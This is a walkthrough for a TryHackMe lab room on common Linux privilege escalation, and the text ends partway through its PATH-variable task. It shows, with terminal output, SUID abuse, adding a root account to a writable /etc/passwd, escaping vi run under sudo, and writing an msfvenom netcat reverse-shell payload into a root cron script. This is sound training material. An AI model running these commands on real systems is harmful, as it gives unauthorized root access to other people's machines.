# Common Linux PrivEsc

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Easy
Tags: -
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Premium
Description:
A room explaining common Linux privilege escalation
```

Room link: [https://tryhackme.com/room/commonlinuxprivesc](https://tryhackme.com/room/commonlinuxprivesc)

## Solution

### Task 1: Get Connected

This room will explore common Linux Privilege Escalation vulnerabilities and techniques, but in order to do that, we'll need to do a few things first!

1. Deploy the machine
2. Connect to the TryHackMe OpenVPN Server (See [https://tryhackme.com/access](https://tryhackme.com/access) for help!) or deploy the AttackBox

---------------------------------------------------------------------------------------

### Task 2: Understanding Privesv

#### What does "privilege escalation" mean?

At it's core, Privilege Escalation usually involves going from a lower permission to a higher permission. More technically, it's the exploitation of a vulnerability, design flaw or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

#### Why is it important?

Rarely when doing a CTF or real-world penetration test, will you be able to gain a foothold (initial access) that affords you administrator access. Privilege escalation is crucial, because it lets you gain system administrator levels of access. This allow you to do many things, including:

- Reset passwords
- Bypass access controls to compromise protected data
- Edit software configurations
- Enable persistence, so you can access the machine again later.
- Change privilege of users
- Get that cheeky root flag ;)

As well as any other administrator or super user commands that you desire.

---------------------------------------------------------------------------------------

### Task 3: Direction of Privilege Escalation

#### Privilege Tree

![Direction of PrivEsc](Images/Direction_of_PrivEsc.png)

#### There are two main privilege escalation variants

**Horizontal privilege escalation**: This is where you expand your reach over the compromised system by taking over a different user who is on the same privilege level as you. For instance, a normal user hijacking another normal user (rather than elevating to super user). This allows you to inherit whatever files and access that user has. This can be used, for example, to gain access to another normal privilege user, that happens to have an SUID file attached to their home directory (more on these later) which can then be used to get super user access. [Travel sideways on the tree]

**Vertical privilege escalation (privilege elevation)**: This is where you attempt to gain higher privileges or access, with an existing account that you have already compromised. For local privilege escalation attacks this might mean hijacking an account with administrator privileges or root privileges. [Travel up on the tree]

---------------------------------------------------------------------------------------

### Task 4: Enumeration

#### What is LinEnum?

LinEnum is a simple bash script that performs common commands related to privilege escalation, saving time and allowing more effort to be put toward getting root. It is important to understand what commands LinEnum executes, so that you are able to manually enumerate privesc vulnerabilities in a situation where you're unable to use LinEnum or other like scripts. In this room, we will explain what LinEnum is showing, and what commands can be used to replicate it.

#### Where to get LinEnum

You can download a local copy of LinEnum from:

[https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

It's worth keeping this somewhere you'll remember, because LinEnum is an invaluable tool.

#### How do I get LinEnum on the target machine?

There are two ways to get LinEnum on the target machine. The first way, is to go to the directory that you have your local copy of LinEnum stored in, and start a Python web server using `python3 -m http.server 8000` [1]. Then using `wget` on the target machine, and your local IP, you can grab the file from your local machine [2]. Then make the file executable using the command `chmod +x FILENAME.sh`.

1:
![LinEnum Share](Images/LinEnum_Share.png)

2:
![LinEnum Download](Images/LinEnum_Download.png)

#### Other Methods

In case you're unable to transport the file, you can also, if you have sufficient permissions, copy the raw LinEnum code from your local machine [3] and paste it into a new file on the target, using Vi or Nano [4]. Once you've done this, you can save the file with the ".sh" extension. Then make the file executable using the command "chmod +x FILENAME.sh". You now have now made your own executable copy of the LinEnum script on the target machine!

3:
![LinEnum Copy](Images/LinEnum_Copy.png)

4:
![LinEnum Paste](Images/LinEnum_Paste.png)

#### Running LinEnum

LinEnum can be run the same way you run any bash script, go to the directory where LinEnum is and run the command `./LinEnum.sh`.

#### Understanding LinEnum Output

The LinEnum output is broken down into different sections, these are the main sections that we will focus on:

**Kernel**: Kernel information is shown here. There is most likely a kernel exploit available for this machine.

**Can we read/write sensitive files**: The world-writable files are shown below. These are the files that any authenticated user can read and write to. By looking at the permissions of these sensitive files, we can see where there is misconfiguration that allows users who shouldn't usually be able to, to be able to write to sensitive files.

**SUID Files**: The output for SUID files is shown here. There are a few interesting items that we will definitely look into as a way to escalate privileges. SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. It allows the file to run with permissions of whoever the owner is. If this is root, it runs with root permissions. It can allow us to escalate privileges.

**Crontab Contents**: The scheduled cron jobs are shown below. Cron is used to schedule commands at a specific time. These scheduled commands or tasks are known as “cron jobs”. Related to this is the crontab command which creates a crontab file containing commands and instructions for the cron daemon to execute. There is certainly enough information to warrant attempting to exploit Cronjobs here.

There's also a lot of other useful information contained in this scan. Lets have a read!

---------------------------------------------------------------------------------------

#### First, lets SSH into the target machine, using the credentials `user3:password`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Common_Linux_Privesc]
└─$ export TARGET_IP=10.114.184.61  

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Common_Linux_Privesc]
└─$ ssh user3@$TARGET_IP                        
The authenticity of host '10.114.184.61 (10.114.184.61)' can't be established.
ED25519 key fingerprint is SHA256:jLEFDbU9QfFrO7qiwZE+2jefy4BgIndRJj79zvdIZoE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.114.184.61' (ED25519) to the list of known hosts.
user3@10.114.184.61's password: 
Welcome to Linux Lite 4.4 (GNU/Linux 4.15.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

413 packages can be updated.
195 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Welcome to Linux Lite 4.4 user3
 
Sunday 12 April 2026, 06:28:55
Memory Usage: 306/1991MB (15.37%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
user3@polobox:~$ 
```

This is to simulate getting a foothold on the system as a normal privilege user.

#### What is the target's hostname?

```bash
user3@polobox:~$ wget http://192.168.146.103:8000/LinEnum.sh
--2026-04-12 06:30:20--  http://192.168.146.103:8000/LinEnum.sh
Connecting to 192.168.146.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: ‘LinEnum.sh’
LinEnum.sh                                            100%[=========================================================================================================================>]  45.54K  53.1KB/s    in 0.9s    

2026-04-12 06:30:21 (53.1 KB/s) - ‘LinEnum.sh’ saved [46631/46631]

user3@polobox:~$ chmod +x LinEnum.sh 
user3@polobox:~$ ./LinEnum.sh 

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Sun Apr 12 06:32:00 EDT 2026


### SYSTEM ##############################################
[-] Kernel information:
Linux polobox 4.15.0-45-generic #48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.15.0-45-generic (buildd@lgw01-amd64-031) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Linux Lite 4.4"
NAME="Ubuntu"
VERSION="18.04.2 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.2 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic


[-] Hostname:
polobox

<--- snip--->
```

Answer: `polobox`

#### Look at the output of /etc/passwd how many "user[x]" are there on the system?

```text
<--- snip--->
[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:117:Light Display Manager:/var/lib/lightdm:/bin/false
ntp:x:109:119::/home/ntp:/bin/false
avahi:x:110:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
colord:x:111:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
nm-openconnect:x:114:124:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/bin/false
nm-openvpn:x:115:125:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/bin/false
pulse:x:116:126:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:117:128:RealtimeKit,,,:/proc:/bin/false
saned:x:118:129::/var/lib/saned:/bin/false
usbmux:x:119:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
geoclue:x:103:105::/var/lib/geoclue:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
user1:x:1000:1000:user1,,,:/home/user1:/bin/bash
user2:x:1001:1001:user2,,,:/home/user2:/bin/bash
user3:x:1002:1002:user3,,,:/home/user3:/bin/bash
user4:x:1003:1003:user4,,,:/home/user4:/bin/bash
statd:x:120:65534::/var/lib/nfs:/usr/sbin/nologin
user5:x:1004:1004:user5,,,:/home/user5:/bin/bash
user6:x:1005:1005:user6,,,:/home/user6:/bin/bash
mysql:x:121:131:MySQL Server,,,:/var/mysql:/bin/bash
user7:x:1006:0:user7,,,:/home/user7:/bin/bash
user8:x:1007:1007:user8,,,:/home/user8:/bin/bash
sshd:x:122:65534::/run/sshd:/usr/sbin/nologin

<--- snip--->
```

Answer: `8`

#### How many available shells are there on the system?

```text
<--- snip--->
[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash

<--- snip--->
```

Answer: `4`

#### What is the name of the bash script that is set to run every 5 minutes by cron?

Hint: It's on user4's desktop

```bash
<--- snip--->
[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/5  *    * * * root    /home/user4/Desktop/autoscript.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

<--- snip--->
```

Answer: `autoscript.sh`

#### What critical file has had its permissions changed to allow some users to write to it?

Hint: Think about where passwords are stored on Linux

```text
<--- snip--->
[-] Can we read/write sensitive files:
-rw-rw-r-- 1 root root 2694 Mar  6  2020 /etc/passwd
-rw-r--r-- 1 root root 1087 Jun  5  2019 /etc/group
-rw-r--r-- 1 root root 581 Apr 22  2016 /etc/profile
-rw-r----- 1 root shadow 2359 Mar  6  2020 /etc/shadow

<--- snip--->
```

Answer: `/etc/passwd`

Well done! Bear the results of the enumeration stage in mind as we continue to exploit the system!

---------------------------------------------------------------------------------------

### Task 5: Abusing SUID/GUID Files

#### Finding and Exploiting SUID Files

The first step in Linux privilege escalation exploitation is to check for files with the SUID/GUID bit set. This means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!

#### What is an SUID binary?

As we all know in Linux everything is a file, including directories and devices which have permissions to allow or restrict three operations i.e. read/write/execute. So when you set permission for any file, you should be aware of the Linux users to whom you allow or restrict all three permissions. Take a look at the following demonstration of how maximum privileges (rwx-rwx-rwx) look:

- r = read
- w = write
- x = execute

|user|group|others|
|:----:|:----:|:----:|
|rwx|rwx|rwx|
|421|421|421|

The maximum number of bit that can be used to set permission for each user is 7, which is a combination of read (4) write (2) and execute (1) operation. For example, if you set permissions using "chmod" as 755, then it will be: rwxr-xr-x.

But when special permission is given to each user it becomes SUID or SGID. When extra bit “4” is set to user(Owner) it becomes SUID (Set user ID) and when bit “2” is set to group it becomes SGID (Set Group ID).

Therefore, the permissions to look for when looking for SUID is:

SUID:  
rws-rwx-rwx

GUID:  
rwx-rws-rwx

#### Finding SUID Binaries

We already know that there is SUID capable files on the system, thanks to our LinEnum scan. However, if we want to do this manually we can use the command: `find / -perm -u=s -type f 2>/dev/null` to search the file system for SUID/GUID files. Let's break down this command.

- **find** - Initiates the "find" command
- `/` - Searches the whole file system
- **-perm** - searches for files with specific permissions
- **-u=s** - Any of the permission bits mode are set for the file. Symbolic modes are accepted in this form
- **-type f** - Only search for files
- **2>/dev/null** - Suppresses errors

---------------------------------------------------------------------------------------

#### What is the path of the file in user3's directory that stands out to you?

```text
<--- snip--->
[-] SUID files:
-rwsr-xr-x 1 root root 113336 Apr 25  2019 /sbin/mount.nfs
-rwsr-xr-x 1 root root 18400 Sep 25  2017 /sbin/mount.ecryptfs_private
-rwsr-xr-x 1 root root 35600 Mar 29  2018 /sbin/mount.cifs
-rwsr-xr-- 1 root dip 378600 Jun 12  2018 /usr/sbin/pppd
-rwsr-xr-x 1 root root 75824 Jan 25  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 22520 Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 44528 Jan 25  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 59640 Jan 25  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 18448 Mar  9  2017 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 76496 Jan 25  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 22528 Mar  9  2017 /usr/bin/arping
-rwsr-xr-x 1 root root 40344 Jan 25  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 149080 Jan 17  2018 /usr/bin/sudo
-rwsr-sr-x 1 root root 10232 Oct 25  2018 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 14328 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Nov 15  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 64424 Mar  9  2017 /bin/ping
-rwsr-xr-x 1 root root 44664 Jan 25  2018 /bin/su
-rwsr-xr-x 1 root root 146128 Nov 30  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 43088 Oct 15  2018 /bin/mount
-rwsr-xr-x 1 root root 26696 Oct 15  2018 /bin/umount
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 8392 Jun  4  2019 /home/user5/script
-rwsr-xr-x 1 root root 8392 Jun  4  2019 /home/user3/shell

<--- snip--->
```

Answer: `/home/user3/shell`

We know that "shell" is an SUID bit file, therefore running it will run the script as a root user! Lets run it!

```bash
user3@polobox:~$ ls -l shell 
-rwsr-xr-x 1 root root 8392 Jun  4  2019 shell
user3@polobox:~$ ./shell 
You Can't Find Me
Welcome to Linux Lite 4.4 user3
 
Sunday 12 April 2026, 06:51:12
Memory Usage: 340/1991MB (17.08%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
root@polobox:~# id
uid=0(root) gid=0(root) groups=0(root),1002(user3)
root@polobox:~# exit
exit
user3@polobox:~$ 
```

Congratulations! You should now have a shell as root user, well done!

---------------------------------------------------------------------------------------

### Task 6: Exploiting Writeable /etc/passwd

#### Exploiting a writable /etc/passwd

Continuing with the enumeration of users, we found that **user7** is a member of the **root** group with **gid 0**. And we already know from the **LinEnum** scan that `/etc/passwd` file is writable for the user. So from this observation, we concluded that **user7** can edit the `/etc/passwd` file.

#### Understanding /etc/passwd

The `/etc/passwd` file stores essential information, which is required during login. In other words, it stores user account information. The `/etc/passwd` is a **plain text file**. It contains a list of the system’s accounts, giving for each account some useful information like user ID, group ID, home directory, shell, and more.

The `/etc/passwd` file should have general read permission as many command utilities use it to map user IDs to user names. However, write access to the `/etc/passwd` must only limit for the superuser/root account. When it doesn't, or a user has erroneously been added to a write-allowed group. We have a vulnerability that can allow the creation of a root user that we can access.

#### Understanding /etc/passwd format

The `/etc/passwd` file contains one entry per line for each user (user account) of the system. All fields are separated by a colon : symbol. Total of seven fields as follows. Generally, /etc/passwd file entry looks as follows:

`test:x:0:0:root:/root:/bin/bash`

[as divided by colon (:)]

1. **Username**: It is used when user logs in. It should be between 1 and 32 characters in length.
2. **Password**: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
3. **User ID (UID)**: Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
4. **Group ID (GID)**: The primary group ID (stored in /etc/group file)
5. **User ID Info**: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
6. **Home directory**: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
7. **Command/shell**: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

#### How to exploit a writable /etc/passwd

It's simple really, if we have a writable `/etc/passwd` file, we can write a new line entry according to the above formula and create a new user! We add the password hash of our choice, and set the UID, GID and shell to root. Allowing us to log in as our own root user!

---------------------------------------------------------------------------------------

#### Then use "su" to swap to user7, with the password "password"

```bash
root@polobox:~# exit
exit
user3@polobox:~$ su user7
Password: 
Welcome to Linux Lite 4.4 user7
 
Sunday 12 April 2026, 06:59:57
Memory Usage: 340/1991MB (17.08%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
user7@polobox:/home/user3$ id
uid=1006(user7) gid=0(root) groups=0(root)
user7@polobox:/home/user3$ 
```

#### Having read the information above, what direction privilege escalation is this attack?

Answer: `vertical`

Before we add our new user, we first need to create a compliant password hash to add!  
We do this by using the command: `openssl passwd -1 -salt [salt] [password]`

#### What is the hash created by using this command with the salt, "new" and the password "123"?

```bash
user7@polobox:/home/user3$ openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1
user7@polobox:/home/user3$ 
```

Answer: `$1$new$p7ptkEKU1HnaHpRtzNizS1`

Great! Now we need to take this value, and create a new root user account.

#### What would the /etc/passwd entry look like for a root user with the username "new" and the password hash we created before?

Hint: username:passwordhash:0:0:root:/root:/bin/bash

Answer: `new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash`

Great! Now you've got everything you need. Just add that entry to the end of the /etc/passwd file!

```bash
user7@polobox:/home/user3$ vi /etc/passwd
user7@polobox:/home/user3$ tail -n3 /etc/passwd
user8:x:1007:1007:user8,,,:/home/user8:/bin/bash
sshd:x:122:65534::/run/sshd:/usr/sbin/nologin
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

Now, use "su" to login as the "new" account, and then enter the password.

```bash
user7@polobox:/home/user3$ su new
Password: 
Welcome to Linux Lite 4.4
 
You are running in superuser mode, be very careful.
 
Sunday 12 April 2026, 07:05:28
Memory Usage: 343/1991MB (17.23%)
Disk Usage: 6/217GB (3%)
 
root@polobox:/home/user3# id
uid=0(root) gid=0(root) groups=0(root)
root@polobox:/home/user3# exit
exit
user7@polobox:/home/user3$ 
```

If you've done everything correctly- you should be greeted by a root prompt! Congratulations!

---------------------------------------------------------------------------------------

### Task 7: Escaping Vi Editor

#### Sudo -l

This exploit comes down to how effective our user account enumeration has been. Every time you have access to an account during a CTF scenario, you should use `sudo -l` to list what commands you're able to use as a super user on that account. Sometimes, like this, you'll find that you're able to run certain commands as a root user without the root password. This can enable you to escalate privileges.

#### Escaping Vi

Running this command on the "user8" account shows us that this user can run vi with root privileges. This will allow us to escape vim in order to escalate privileges and get a shell as the root user!

#### Misconfigured Binaries and GTFOBins

If you find a misconfigured binary during your enumeration, or when you check what binaries a user account you have access to can access, a good place to look up how to exploit them is [GTFOBins](https://gtfobins.org/). GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. It provides a really useful breakdown of how to exploit a misconfigured binary and is the first place you should look if you find one on a CTF or Pentest.

---------------------------------------------------------------------------------------

#### Then use "su" to swap to user8, with the password "password"

```bash
root@polobox:/home/user3# exit
exit
user7@polobox:/home/user3$ su user8
Password: 
Welcome to Linux Lite 4.4 user8
 
Sunday 12 April 2026, 07:09:39
Memory Usage: 343/1991MB (17.23%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
user8@polobox:/home/user3$ id
uid=1007(user8) gid=1007(user8) groups=1007(user8)
user8@polobox:/home/user3$ 
```

#### Let's use the "sudo -l" command, what does this user require (or not require) to run vi as root?

Hint: No password!

```bash
user8@polobox:/home/user3$ sudo -l
Matching Defaults entries for user8 on polobox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user8 may run the following commands on polobox:
    (root) NOPASSWD: /usr/bin/vi
user8@polobox:/home/user3$ 
```

Answer: `NOPASSWD`

So, all we need to do is open vi as root, by typing "sudo vi" into the terminal.

Now, type ":!sh" to open a shell!

```bash
user8@polobox:/home/user3$ sudo vi

# id
uid=0(root) gid=0(root) groups=0(root)
# exit

Press ENTER or type command to continue
user8@polobox:/home/user3$ 
```

---------------------------------------------------------------------------------------

### Task 8: Exploiting Crontab

#### What is Cron?

The Cron daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as one-time events or as recurring tasks. You can create a crontab file containing commands and instructions for the Cron daemon to execute.

#### How to view what Cronjobs are active

We can use the command "cat /etc/crontab" to view what cron jobs are scheduled. This is something you should always check manually whenever you get a chance, especially if LinEnum, or a similar script, doesn't find anything.

#### Format of a Cronjob

Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job.

- `#` = ID
- m = Minute
- h = Hour
- dom = Day of the month
- mon = Month
- dow = Day of the week
- user = What user the command will run as
- command = What command should be run

For Example,

```text
# m h dom mon dow user  command
*/5  *    * * * root    /home/user4/Desktop/autoscript.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
```

#### How can we exploit this?

We know from our LinEnum scan, that the file `autoscript.sh`, on user4's Desktop is scheduled to run every five minutes. It is owned by root, meaning that it will run with root privileges, despite the fact that we can write to this file. The task then is to create a command that will return a shell and paste it in this file. When the file runs again in five minutes the shell will be running as root.

Let's do it!

---------------------------------------------------------------------------------------

#### Then use "su" to swap to user4, with the password "password"

```bash
user8@polobox:/home/user3$ su user4
Password: 
Welcome to Linux Lite 4.4 user4
 
Sunday 12 April 2026, 07:17:32
Memory Usage: 346/1991MB (17.38%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
user4@polobox:/home/user3$ id
uid=1003(user4) gid=1003(user4) groups=1003(user4),0(root)
user4@polobox:/home/user3$ 
```

Now, on our host machine- let's create a payload for our cron exploit using msfvenom.

#### What is the flag to specify a payload in msfvenom?

Answer: `-p`

#### Create a payload using: "msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R"

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Common_Linux_Privesc]
└─$ msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.146.103 LPORT=8888
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 93 bytes
mkfifo /tmp/aovs; nc 192.168.146.103 8888 0</tmp/aovs | /bin/sh >/tmp/aovs 2>&1; rm /tmp/aovs
```

#### What directory is the "autoscript.sh" under?

Answer: `/home/user4/Desktop`

#### Lets replace the contents of the file with our payload using: "echo [MSFVENOM OUTPUT] > autoscript.sh"

```bash
user4@polobox:/home/user3$ cd ~/Desktop/
user4@polobox:~/Desktop$ ls -l
total 28
-rwxrwxr-x 1 user4 user4  69 Jun  4  2019 autoscript.sh
-rwxr-xr-x 1 user4 user4 152 Jun  4  2019 computer.desktop
-rwxr-xr-x 1 user4 user4 268 Jun  4  2019 helpmanual.desktop
-rwxr-xr-x 1 user4 user4 160 Jun  4  2019 network.desktop
-rwxr-xr-x 1 user4 user4 159 Jun  4  2019 recyclebin.desktop
-rwxr-xr-x 1 user4 user4 155 Jun  4  2019 settings.desktop
-rwxr-xr-x 1 user4 user4 149 Jun  4  2019 userfiles.desktop
user4@polobox:~/Desktop$ echo 'mkfifo /tmp/aovs; nc 192.168.146.103 8888 0</tmp/aovs | /bin/sh >/tmp/aovs 2>&1; rm /tmp/aovs' > autoscript.sh 
user4@polobox:~/Desktop$ cat autoscript.sh 
mkfifo /tmp/aovs; nc 192.168.146.103 8888 0</tmp/aovs | /bin/sh >/tmp/aovs 2>&1; rm /tmp/aovs
user4@polobox:~/Desktop$ 
```

After copying the code into autoscript.sh file we wait for cron to execute the file.

#### Start a netcat listener using: "nc -lvnp 8888" and wait for our shell to land

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Common_Linux_Privesc]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.146.103] from (UNKNOWN) [10.114.184.61] 38124
id
uid=0(root) gid=0(root) groups=0(root)
hostname
polobox
exit
```

After about 5 minutes, you should have a shell as root land in your netcat listening session! Congratulations!

---------------------------------------------------------------------------------------

### Task 9: Exploiting PATH Variable

#### What is PATH?

PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user runs any command in the terminal, it searches for executable files with the help of the PATH Variable in response to commands executed by a user.

It is very simple to view the Path of the relevant user with help of the command `echo $PATH`.

#### How does this let us escalate privileges?

Let's say we have an SUID binary. Running it, we can see that it’s calling the system shell to do a basic process like list processes with "ps". Unlike in our previous SUID example, in this situation we can't exploit it by supplying an argument for command injection, so what can we do to try and exploit this?

We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we've written instead!

As with any SUID file, it will run this command with the same privileges as the owner of the SUID file! If this is root, using this method we can run whatever commands we like as root!

Let's do it!

---------------------------------------------------------------------------------------

#### Then use "su" to swap to user5, with the password "password"

```bash
user4@polobox:~/Desktop$ exit
exit
user8@polobox:/home/user3$ su user5
Password: 
Welcome to Linux Lite 4.4 user5
 
Sunday 12 April 2026, 07:33:27
Memory Usage: 346/1991MB (17.38%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
user5@polobox:/home/user3$ id
uid=1004(user5) gid=1004(user5) groups=1004(user5)
user5@polobox:/home/user3$ 
```

#### Let's go to user5's home directory, and run the file "script". What command do we think that it's executing?

```bash
user5@polobox:/home/user3$ cd ~
user5@polobox:~$ ls -l
total 44
drwxr-xr-x 2 user5 user5 4096 Jun  4  2019 Desktop
drwxr-xr-x 2 user5 user5 4096 Jun  4  2019 Documents
drwxr-xr-x 2 user5 user5 4096 Jun  4  2019 Downloads
drwxr-xr-x 2 user5 user5 4096 Jun  4  2019 Music
drwxr-xr-x 2 user5 user5 4096 Jun  4  2019 Pictures
drwxr-xr-x 2 user5 user5 4096 Jun  4  2019 Public
-rwsr-xr-x 1 root  root  8392 Jun  4  2019 script
drwxr-xr-x 2 user5 user5 4096 Jun  4  2019 Templates
drwxr-xr-x 2 user5 user5 4096 Jun  4  2019 Videos
user5@polobox:~$ ./script 
Desktop  Documents  Downloads  Music  Pictures  Public  script  Templates  Videos
